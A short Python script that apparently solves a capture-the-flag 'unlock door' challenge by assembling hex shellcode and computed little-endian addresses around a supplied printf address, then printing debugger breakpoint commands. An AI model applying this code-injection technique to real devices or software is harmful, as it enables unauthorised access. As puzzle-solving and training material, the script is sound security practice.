import sys

# 8bytes to unlock door:
#             vvvv---- lendian (_INT = printf_addr + 0x18a)
#                 vvvv---- lendian (printf_addr - 8)
# 3f407f00b012iiiipppp
# 3f407f00b012

def lendian( word ):
    return word[2:4] + word[0:2]


def main(argv):
    printf_addr = int( argv[1], 16 )

    nop = '0343'

    pwd = nop * 2
    pwd += '3f407f00'

    pwd += lendian( hex( 0xffff & (printf_addr - 8 ) )[2:] )

    pwd += nop * 2
    pwd += 'b012' + lendian( hex( 0xffff & (printf_addr + 0x18a) )[2:] )

    print pwd
    print 'b', hex( 0xffff & (printf_addr - 8 ) )[2:], '; c'


main(sys.argv)